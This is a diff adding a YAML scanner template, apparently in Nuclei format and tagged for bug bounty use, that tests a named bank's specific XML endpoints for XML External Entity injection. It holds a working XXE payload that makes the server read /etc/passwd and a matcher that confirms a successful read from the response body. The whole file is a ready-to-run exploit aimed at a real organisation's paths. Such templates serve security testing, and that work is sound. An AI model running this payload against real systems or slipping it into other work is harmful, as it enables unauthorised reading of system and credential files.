@@ -1,0 +1,36 @@
+id: alfabank-xxe
+
+info:
+  name: Alfabank - XXE via XML Endpoints
+  author: bugbounty
+  severity: high
+  description: XML External Entity injection
+  tags: xxe,alfabank
+
+http:
+  - raw:
+      - |
+        GET /0.2/export/atm?mode=xml HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /_/_currency.xml HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <root>&xxe;</root>
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
+
+      - type: word
+        words:
+          - "ENTITY"
+          - "DOCTYPE"
+        part: body
